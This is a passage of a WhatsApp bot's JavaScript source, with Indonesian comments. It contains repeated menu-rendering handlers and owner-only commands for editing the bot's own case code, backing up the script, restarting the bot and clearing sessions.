                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'cpanelmenu':
            case 'menucpanel': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐂𝐏𝐀𝐍𝐄𝐋 𝐕𝟏\`  
┃${prefix}1gb - 10gb 
┃${prefix}unli
┃${prefix}listpanel 
┃${prefix}delpanel 
┃${prefix}cadmin 
┃${prefix}listadmin 
┃${prefix}deladmin
┃${prefix}clearpanel
┃${prefix}addsrv
┃${prefix}addresseler 
┃${prefix}listresseler 
┃${prefix}delresseler
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('cpanelmenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'cpanelmenuv2':
            case 'menucpanelv2': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐂𝐏𝐀𝐍𝐄𝐋 𝐕𝟐\`  
┃${prefix}1gbv2 - 10gbv2
┃${prefix}unliv2
┃${prefix}listpanelv2
┃${prefix}delpanelv2
┃${prefix}cadminv2
┃${prefix}listadminv2
┃${prefix}deladminv2
┃${prefix}clearpanelv2
┃${prefix}addsrvv2
┃${prefix}addgrupresseler 
┃${prefix}listgrupresseler 
┃${prefix}delgrupresseler
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('cpanelmenuv2');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'downloadmenu':
            case 'menudownload': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃\`  
┃${prefix}play
┃${prefix}tt
┃${prefix}ttsearch
┃${prefix}fb
┃${prefix}ig
┃${prefix}spotify
┃${prefix}capcut
┃${prefix}ytmp3
┃${prefix}pin
┃${prefix}pinterest
┃${prefix}mediafire
┃${prefix}twitter
┃${prefix}donghua
┃${prefix}sfile
┃${prefix}soundcloud
┃${prefix}scdl
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('downloadmenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'randommenu':
            case 'menurandom': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐑𝐀𝐍𝐃𝐎𝐌\`  
┃${prefix}cekkaya
┃${prefix}cekfemboy
┃${prefix}cekkontol
┃${prefix}cekmemek
┃${prefix}cekcantik
┃${prefix}ceklesby
┃${prefix}tekateki
┃${prefix}jawabteka
┃${prefix}hentai
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('randommenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'groupmenu':
            case 'menugroup': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐆𝐑𝐎𝐔𝐏\`  
┃${prefix}mulaiabsen 
┃${prefix}absen
┃${prefix}listabsen
┃${prefix}delabsen
┃${prefix}intro
┃${prefix}opentime
┃${prefix}closetime
┃${prefix}onsholat
┃${prefix}offsholat
┃${prefix}autosholat
┃${prefix}cekidgc
┃${prefix}idgc
┃${prefix}buy1gb - buyunli
┃${prefix}ceksewa
┃${prefix}runtime
┃${prefix}bot
┃${prefix}imsakiyah
┃${prefix}totalpesan
┃${prefix}totalchat
┃${prefix}resetchat
┃${prefix}daftar
┃${prefix}ceksn
┃${prefix}unreg
┃${prefix}tagall
┃${prefix}addlist
┃${prefix}dellist
┃${prefix}updatelist
┃${prefix}list
┃${prefix}afk
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('groupmenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;



            //** case file manager menu **
            case 'listcase': {
                if (!isAn) return m.reply(mess.owner);
                const listCase = async () => {
                    let code = await fs.promises.readFile("./Vanness.js", "utf8");
                    code = code.replace(/\/\/.*$/gm, "");
                    code = code.replace(/\/\*[\s\S]*?\*\//gm, "");
                    const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g;
                    const matches = [];
                    let match;
                    while ((match = regex.exec(code))) {
                        matches.push(match[1]);
                    }
                    let teks = `Total Fitur Case (${matches.length})\n\n`;
                    matches.forEach(x => {
                        teks += `- ${x}\n`;
                    });
                    return teks;
                };
                reply(await listCase());
            }
                break;

            case "getcase": {
                if (!isAn) return m.reply(mess.owner);
                if (!text) return m.reply(`Contoh: ${prefix}getcase menu`)
                const getcase = (cases) => {
                    return "case " + `\"${cases}\"` + fs.readFileSync('./Vanness.js').toString().split('case \"' + cases + '\"')[1].split("break")[0] + "break"
                }
                try {
                    m.reply(`${getcase(q)}`)
                } catch (e) {
                    return m.reply(`Case *${text}* tidak ditemukan`)
                }
            }
                break

            case 'delcase': {
                if (!isAn) return m.reply(mess.owner);
                if (!q) return reply(example(`Nama case-nya\n*${prefix}listcase* untuk melihat semua case`));
                const hapusCase = async (filePath, caseName) => {
                    try {
                        let data = await fs.promises.readFile(filePath, "utf8");
                        const regex = new RegExp(`case\\s+['"\`]${caseName}['"\`]:[\\s\\S]*?break`, "g");
                        const modifiedData = data.replace(regex, "");
                        await fs.promises.writeFile(filePath, modifiedData, "utf8");
                        console.log(`Case '${caseName}' berhasil dihapus dari file.`);
                    } catch (err) {
                        console.error("Terjadi kesalahan:", err);
                    }
                };
                await hapusCase("./Vanness.js", q); // sesuaikan nama file
                reply(`Berhasil menghapus case *${q}*`);
            }
                break;

            case 'addcase': {
                if (!isAn) return m.reply(mess.owner);
                if (!text) return m.reply(`Mana codenya?\n\nContoh penggunaan:\n${prefix + command} case 'tes': m.reply('halo'); break`);



                try {
                    const data = fs.readFileSync(__filename, 'utf-8');
                    const marker = "case 'addcase':";
                    const insertIndex = data.indexOf(marker);

                    if (insertIndex === -1) {
                        return m.reply("❌ Gagal menemukan posisi marker 'addcase' di file ini.");
                    }

                    const caseBaru = `\n// [NEW CASE ADDED @ ${new Date().toLocaleTimeString()}]\n${text}\n\n`;

                    const finalCode = data.slice(0, insertIndex) + caseBaru + data.slice(insertIndex);

                    fs.writeFileSync(__filename, finalCode, 'utf-8');

                    m.reply("*Berhasil menambahkan case baru!*");

                } catch (err) {
                    console.error(err);
                    m.reply(`❌ Terjadi error saat menyimpan: ${err.message}`);
                }
            }
                break;


            // ** case owner menu **
            case "ambilq": case "q": {
                if (!isAn) return m.reply(mess.owner);
                if (!m.quoted) return
                m.reply(JSON.stringify(m.quoted.fakeObj.message, null, 2))
            }
                break

            case "bck": case "backup": {
                const sender = m.sender.split("@")[0];
                const isCreator = global.owner.includes(sender);

                if (!isCreator && m.sender !== botNumber) {
                    return m.reply(mess.owner);
                }

                try {
                    m.reply("Processing Backup Script . .");
                    const tmpDir = "./data/trash";
                    if (fs.existsSync(tmpDir)) {
                        try {
                            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
                            for (let file of files) fs.unlinkSync(`${tmpDir}/${file}`);
                        } catch { }
                    }

                    const dateDisplay = typeof global.tanggal === 'function' ? global.tanggal(Date.now()) : new Date().toDateString();

                    const safeDate = dateDisplay.replace(/[^a-zA-Z0-9]/g, '_');
                    const name = `backup-${safeDate}`;

                    const exclude = ["node_modules", "Auth", "session", "package-lock.json", "yarn.lock", ".npm", ".cache", ".git", ".gitignore", "setbot.json"];

                    const filesToZip = fs.readdirSync(process.cwd())
                        .filter(f => !exclude.includes(f) && f !== "" && !f.endsWith(".zip"));

                    if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

                    execSync(`zip -r "${name}.zip" ${filesToZip.join(" ")}`);

                    const zipPath = `./${name}.zip`;
                    const zipBuffer = fs.readFileSync(zipPath);

                    await sock.sendMessage(m.sender, {
                        document: zipBuffer,
                        fileName: `${name}.zip`,
                        caption: `*SUCCESS BACKUP SCRIPT*\n\n` +
                            `- 📅 Tanggal: ${dateDisplay}\n` +
                            `*💬 File aman tersimpan.*`,
                        mimetype: "application/zip"
                    }, { quoted: m });

                    if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

                    if (m.isGroup) m.reply("Script bot berhasil dikirim ke private chat.");

                } catch (err) {
                    console.error("Backup Error:", err);
                    m.reply(`❌ Gagal Backup:\n${err.message}`);
                }
            }
                break;

            case "rst": case "restart": {
                if (!isAn) return reply(mess.owner);
                const restartServer = () => {
                    const newProcess = spawn(process.argv[0], process.argv.slice(1), {
                        detached: true,
                        stdio: "inherit",
                    });
                    process.exit(0);
                };
                await reply(`\`\`\`[✓] Restarting bot . . .\`\`\``);
                setTimeout(() => restartServer(), 4500);
            }
                break

            case "clsesi": case "clearsesi": case "celearsesion": {
                if (!isAn) return reply(mess.owner)
                const pathAuth = "./Auth";
                const pathTrash = "./data/trash";

                if (!fs.existsSync(pathAuth)) fs.mkdirSync(pathAuth, { recursive: true });
                if (!fs.existsSync(pathTrash)) fs.mkdirSync(pathTrash, { recursive: true });
                const dirsesi = fs.readdirSync(pathAuth).filter(e => e !== "creds.json");
                const dirsampah = fs.readdirSync(pathTrash).filter(e => e !== "tmp");

                for (const file of dirsesi) {
                    try {
                        fs.unlinkSync(`${pathAuth}/${file}`);
                    } catch (e) {
                        console.error(`Gagal hapus ${file}:`, e.message);
                    }
                }

                for (const file of dirsampah) {
                    try {
                        fs.unlinkSync(`${pathTrash}/${file}`);
                    } catch (e) {
                        console.error(`Gagal hapus ${file}:`, e.message);
                    }
                }

                reply(`*Berhasil membersihkan sampah ✅*
- *${dirsesi.length}* sampah session
- *${dirsampah.length}* sampah file`);
            };
                break

            case "addowner": case "addown": {
                if (!isAn) return reply(mess.owner)
                if (!m.quoted && !text) return m.reply(example("LU MAU NAMBAH OWNER MANA NOMORNYA PEA"))
                const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
                const input2 = input.split("@")[0]
